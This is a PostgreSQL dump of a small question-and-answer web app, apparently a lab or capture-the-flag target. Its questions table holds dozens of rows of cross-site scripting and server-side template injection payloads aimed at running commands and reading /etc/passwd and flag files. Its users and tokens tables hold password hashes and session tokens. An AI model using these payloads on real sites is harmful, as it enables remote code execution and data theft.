--
-- PostgreSQL database dump
--

-- Dumped from database version 10.12 (Ubuntu 10.12-0ubuntu0.18.04.1)
-- Dumped by pg_dump version 10.12 (Ubuntu 10.12-0ubuntu0.18.04.1)

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- Name: plpgsql; Type: EXTENSION; Schema: -; Owner: 
--

CREATE EXTENSION IF NOT EXISTS plpgsql WITH SCHEMA pg_catalog;


--
-- Name: EXTENSION plpgsql; Type: COMMENT; Schema: -; Owner: 
--

COMMENT ON EXTENSION plpgsql IS 'PL/pgSQL procedural language';


SET default_tablespace = '';

SET default_with_oids = false;

--
-- Name: answers; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.answers (
    id integer NOT NULL,
    description character varying(256),
    owner_id integer,
    question_id integer,
    created date
);


ALTER TABLE public.answers OWNER TO postgres;

--
-- Name: answers_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.answers_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.answers_id_seq OWNER TO postgres;

--
-- Name: answers_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.answers_id_seq OWNED BY public.answers.id;


--
-- Name: categories; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.categories (
    id integer NOT NULL,
    name character varying(64)
);


ALTER TABLE public.categories OWNER TO postgres;

--
-- Name: categories_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.categories_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.categories_id_seq OWNER TO postgres;

--
-- Name: categories_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.categories_id_seq OWNED BY public.categories.id;


--
-- Name: questions; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.questions (
    id integer NOT NULL,
    title character varying(128),
    description character varying(256),
    owner_id integer,
    category_id integer,
    created date,
    needs_mod boolean,
    active boolean
);


ALTER TABLE public.questions OWNER TO postgres;

--
-- Name: questions_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.questions_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.questions_id_seq OWNER TO postgres;

--
-- Name: questions_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.questions_id_seq OWNED BY public.questions.id;


--
-- Name: tokens; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.tokens (
    user_id integer,
    token character varying(64)
);


ALTER TABLE public.tokens OWNER TO postgres;

--
-- Name: users; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.users (
    id integer NOT NULL,
    username character varying(64),
    password character varying(64),
    isadmin boolean,
    ismod boolean,
    email character varying(64)
);


ALTER TABLE public.users OWNER TO postgres;

--
-- Name: users_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.users_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.users_id_seq OWNER TO postgres;

--
-- Name: users_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.users_id_seq OWNED BY public.users.id;


--
-- Name: answers id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.answers ALTER COLUMN id SET DEFAULT nextval('public.answers_id_seq'::regclass);


--
-- Name: categories id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.categories ALTER COLUMN id SET DEFAULT nextval('public.categories_id_seq'::regclass);


--
-- Name: questions id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.questions ALTER COLUMN id SET DEFAULT nextval('public.questions_id_seq'::regclass);


--
-- Name: users id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.users ALTER COLUMN id SET DEFAULT nextval('public.users_id_seq'::regclass);


--
-- Data for Name: answers; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.answers (id, description, owner_id, question_id, created) FROM stdin;
1	So cool! :)	6	1	2020-02-20
2	This could be a game changer if people use it!	3	1	2020-02-20
3	Not yet. We are hoping to have it working after the next sprint.	1	4	2020-02-21
4	Basic searching functionality is in place. Give it a shot!	1	4	2020-02-25
6	Tabs.	1	5	2020-02-21
7	Tabs.	5	5	2020-02-21
8	Tabs.	7	5	2020-02-21
9	Tabs.	3	5	2020-02-22
10	Spaces	8	5	2020-02-22
11	I mean, tabs.	8	5	2020-02-23
12	Working fine here.	7	6	2020-02-21
13	Was slow this morning, but seems okay now.	6	6	2020-02-21
14	Anyone?	8	7	2020-02-23
15	Check out the <code>futurize</code> script.	4	8	2020-02-23
5	Awesome!	8	4	2020-02-25
\.


--
-- Data for Name: categories; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.categories (id, name) FROM stdin;
1	General
2	Tech
3	Offtopic
\.


--
-- Data for Name: questions; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.questions (id, title, description, owner_id, category_id, created, needs_mod, active) FROM stdin;
1	What is this app?	Lot's of people might be wondering what this app is. Well, it's for asking questions and getting answers. No more stale SharePoint files for documentation.	1	1	2020-02-20	f	t
2	Mod Test	This shouldn't show up on the main page!	2	1	2020-02-20	t	t
4	Search Function?	Is search working?	8	1	2020-02-21	f	t
5	Tabs vs Spaces	Which one should we standardize on? I've seen both in source code here.	2	2	2020-02-21	f	t
6	VPN Issues?	Anyone else having issues downloading stuff? VPN is so slow today.	5	2	2020-02-21	f	t
7	Best 4K movies	Just upgraded my home theater to a 4k screen. Any recommendations for some good movies to show off 4k?	8	3	2020-02-22	f	t
8	Python 3	We have a lot of scripts we need to update. Anyone got a guide for porting Python 2 to 3?	3	2	2020-02-21	f	t
27	a	{{a.toUpperCase()}}	2	3	2020-09-14	t	t
28	a	{{ request }}	2	3	2020-09-14	t	t
29	a	{{self}}	2	3	2020-09-14	t	t
30	a	ex = freemarker.template.utility.Execute?new()>${ ex(id)}	2	3	2020-09-14	t	t
31	a	[#assign ex = freemarker.template.utility.Execute?new()]${ ex(id)}	2	3	2020-09-14	t	t
32	a	${freemarker.template.utility.Execute?new()(id)}	2	3	2020-09-14	t	t
33	a	{{app.request.query.filter(0,0,1024,{options:system})}}	2	3	2020-09-14	t	t
34	a	{{ .__class__.__mro__[2].__subclasses__()[40](/etc/passwd).read() }}	2	3	2020-09-14	t	t
35	a	{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](/etc/passwd).read() }}	2	3	2020-09-14	t	t
36	a	{{.__class__.mro()[1].__subclasses__()[396](cat flag.txt,shell=True,stdout=-1).communicate()[0].strip()}}	2	3	2020-09-14	t	t
37	a	{{config.__class__.__init__.__globals__[os].popen(ls).read()}}	2	3	2020-09-14	t	t
38	a	{$smarty.version}	2	3	2020-09-14	t	t
39	a	{php}echo `id`{/php}	2	3	2020-09-14	t	t
40	a	{{[id]|filter(system)}}	2	3	2020-09-14	t	t
41	a	{{[cat$IFS/etc/passwd]|filter(system)}}	2	3	2020-09-14	t	t
42	a	{{[cat\\x20/etc/passwd]|filter(system)}}	2	3	2020-09-14	t	t
43	a	{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}	2	3	2020-09-14	t	t
44	a	{{request|attr([_*2,class,_*2]|join)}}	2	3	2020-09-14	t	t
45	a	{{request|attr([__,class,__]|join)}}	2	3	2020-09-14	t	t
46	a	{{request|attr(__class__)}}	2	3	2020-09-14	t	t
47	a	{{request.__class__}}	2	3	2020-09-14	t	t
48	a	{{request|attr(application)|attr(\\x5f\\x5fglobals\\x5f\\x5f)|attr(\\x5f\\x5fgetitem\\x5f\\x5f)(\\x5f\\x5fbuiltins\\x5f\\x5f)|attr(\\x5f\\x5fgetitem\\x5f\\x5f)(\\x5f\\x5fimport\\x5f\\x5f)(os)|attr(popen)(id)|attr(read)()}}	2	3	2020-09-14	t	t
49	a	{{a.getClass().forName(javax.script.ScriptEngineManager).newInstance().getEngineByName(JavaScript).eval(\\new java.lang.String(xxx)\\)}}	2	3	2020-09-14	t	t
50	a	{{a.getClass().forName(javax.script.ScriptEngineManager).newInstance().getEngineByName(JavaScript).eval(\\var x=new java.lang.ProcessBuilder x.command(\\\\\\whoami\\\\\\) x.start()\\)}}	2	3	2020-09-14	t	t
51	a	{{a.getClass().forName(javax.script.ScriptEngineManager).newInstance().getEngineByName(JavaScript).eval(\\var x=new java.lang.ProcessBuilder x.command(\\\\\\uname\\\\\\,\\\\\\-a\\\\\\) org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\)}}	2	3	2020-09-14	t	t
52	a	{{a.getClass().forName(javax.script.ScriptEngineManager).newInstance().getEngineByName(JavaScript).eval(\\var x=new java.lang.ProcessBuilder x.command(\\\\\\netstat\\\\\\) org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\)}}	2	3	2020-09-14	t	t
53	a	${T(java.lang.System).getenv()}	2	3	2020-09-14	t	t
54	a	${T(java.lang.Runtime).getRuntime().exec(cat etc/passwd)}	2	3	2020-09-14	t	t
56	aa	test	2	3	2020-09-14	t	t
57	fdsa	fdsa	2	3	2020-09-14	t	t
58	ddfdsf	fdsafdsa	2	1	2020-09-14	t	t
3	Inactive Test	This shouldn't show up on the main page!	2	1	2020-02-20	t	t
9	a	b	2	3	2020-09-14	t	t
10	<svg/onload=alert(1)>		2	2	2020-09-14	t	t
11	<strong>a</strong>	<strong>b</strong>	2	1	2020-09-14	t	t
12	a	<strong>a<svg/onload=alert(1)>a</strong>	2	3	2020-09-14	t	t
13	a	{{2*2}}[[3*3]]	2	3	2020-09-14	t	t
14	a	{{3*3}}	2	3	2020-09-14	t	t
15	a	{{3*3}}	2	3	2020-09-14	t	t
16	a	${6*6}	2	3	2020-09-14	t	t
17	a	${{3*3}}	2	3	2020-09-14	t	t
18	a	@(6+5)	2	3	2020-09-14	t	t
19	a	#{3*3}	2	3	2020-09-14	t	t
20	a	#{ 3 * 3 }	2	3	2020-09-14	t	t
21	a	{{dump(app)}}	2	3	2020-09-14	t	t
22	a	{{app.request.server.all|join(,)}}	2	3	2020-09-14	t	t
23	a	{{config.items()}}	2	3	2020-09-14	t	t
24	a	{{ [].class.base.subclasses() }}	2	3	2020-09-14	t	t
25	a	{{.class.mro()[1].subclasses()}}	2	3	2020-09-14	t	t
26	a	{{ .__class__.__mro__[2].__subclasses__() }}	2	3	2020-09-14	t	t
\.


--
-- Data for Name: tokens; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.tokens (user_id, token) FROM stdin;
2	JFBYJGsqenQnUUwzTXU3byhXJ01FMmt3NSFwQGFoQGEqNWdnRW9nQjps
6	fFNFcVZvZUEnfFAgIzd8Z2Eld0FPV1hPNUdFX0BiTmBeYiVPLHVxIEFJ
4	cjdQNlxPYTZDMExnMUdiYmh3STF0dXZuT2tWb200bn5BT1ItUXVqMWpE
3	MnFHIkswRkVqUVFXWnpuXUNhbylSa053byVpYSole11tTilOe1JdSmd1
3	MnFqdXYiMmEnejdBQnJsT1pNOnJrZyZIRE9rNTopc1BlUVQndjsqYEYy
3	KypLJ0EyUjBnSSc7NGdNKnFAYDJCJylbMTAmcDQ7M3lCbFYwc0ZKNGZZ
3	UldyS0ZAbHsrZFlvRXQyUzcmNVJOJmhObzZvdW1bTid7J0hJRm1zZEpg
3	QW9TSXNWV2d6KTc2VUhmZnErdzN3dVBHREBNJiI7UiJVNyZXWW9bMFlN
3	N0tFXURXbGBlTVBKZCYzYFYxOykgdkd1SkE6ZzUwJlEnWUVmZGFhQGZg
3	VSI3NFc1dztKYjM3dGFWTjRLSWgxV0VwXVFvMDI3M25zNDsgeWZSWSI0
3	Ozd6cW9PQjQgNnlEKkphOjdbW0N3NUNFNzB0NFBKQWh0aVZ2MkN3IlV5
3	J0x1JmdvcCs0U01oNEI7Z3BAYXo7YSVsZSc0ZkhmTXJzZDVXcXtMaDZW
3	SWc6RzRXK2lidXNQNzZFO25uezJDe2c0RGt5byBiZFMnOkYpb25HWnZ1
\.


--
-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.users (id, username, password, isadmin, ismod, email) FROM stdin;
3	Alice	VsBALJ88OHAmorsvXeNQTcFca2M==	f	f	alice@answers.local
4	Bob	njEPfgDJ0CAxAH8yFnZVXVDTTRM=	f	f	bob@answers.local
6	Demetri	KL9g4d6C5JynSctHgDPQoLliG9M=	f	f	demetri@answers.local
8	Franco	6P9OkSemHszcHlXQb+rTIa8KPV0=	f	f	franco@answers.local
5	Carl	VFE/mi/SPbW13a4NyAhHoPyRZsI=	f	t	carl@answers.local
7	Evelyn	vo0i+Wp1G2F1SiAGW5c57+94pjk=	f	t	evelyn@answers.local
1	admin	oxloQ7JK1hmHw9FF8tai1n5TolY=	t	t	admin@answers.local
2	anonymous	oxloQ7JK1hmHw9FF8tai1n5TolY=	f	f	anonymous@answers.local
\.


--
-- Name: answers_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.answers_id_seq', 15, true);


--
-- Name: categories_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.categories_id_seq', 3, true);


--
-- Name: questions_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.questions_id_seq', 58, true);


--
-- Name: users_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.users_id_seq', 8, true);


--
-- Name: answers answers_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.answers
    ADD CONSTRAINT answers_pkey PRIMARY KEY (id);


--
-- Name: categories categories_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.categories
    ADD CONSTRAINT categories_pkey PRIMARY KEY (id);


--
-- Name: questions questions_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.questions
    ADD CONSTRAINT questions_pkey PRIMARY KEY (id);


--
-- Name: users users_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.users
    ADD CONSTRAINT users_pkey PRIMARY KEY (id);


--
-- Name: answers answers_owner_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.answers
    ADD CONSTRAINT answers_owner_id_fkey FOREIGN KEY (owner_id) REFERENCES public.users(id);


--
-- Name: answers answers_question_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.answers
    ADD CONSTRAINT answers_question_id_fkey FOREIGN KEY (question_id) REFERENCES public.questions(id);


--
-- Name: questions questions_category_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.questions
    ADD CONSTRAINT questions_category_id_fkey FOREIGN KEY (category_id) REFERENCES public.categories(id);


--
-- Name: questions questions_owner_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.questions
    ADD CONSTRAINT questions_owner_id_fkey FOREIGN KEY (owner_id) REFERENCES public.users(id);


--
-- Name: TABLE answers; Type: ACL; Schema: public; Owner: postgres
--

GRANT ALL ON TABLE public.answers TO webapp;


--
-- Name: SEQUENCE answers_id_seq; Type: ACL; Schema: public; Owner: postgres
--

GRANT ALL ON SEQUENCE public.answers_id_seq TO webapp;


--
-- Name: TABLE categories; Type: ACL; Schema: public; Owner: postgres
--

GRANT ALL ON TABLE public.categories TO webapp;


--
-- Name: SEQUENCE categories_id_seq; Type: ACL; Schema: public; Owner: postgres
--

GRANT ALL ON SEQUENCE public.categories_id_seq TO webapp;


--
-- Name: TABLE questions; Type: ACL; Schema: public; Owner: postgres
--

GRANT ALL ON TABLE public.questions TO webapp;


--
-- Name: SEQUENCE questions_id_seq; Type: ACL; Schema: public; Owner: postgres
--

GRANT ALL ON SEQUENCE public.questions_id_seq TO webapp;


--
-- Name: TABLE tokens; Type: ACL; Schema: public; Owner: postgres
--

GRANT ALL ON TABLE public.tokens TO webapp;


--
-- Name: TABLE users; Type: ACL; Schema: public; Owner: postgres
--

GRANT ALL ON TABLE public.users TO webapp;


--
-- Name: SEQUENCE users_id_seq; Type: ACL; Schema: public; Owner: postgres
--

GRANT ALL ON SEQUENCE public.users_id_seq TO webapp;


--
-- PostgreSQL database dump complete
--

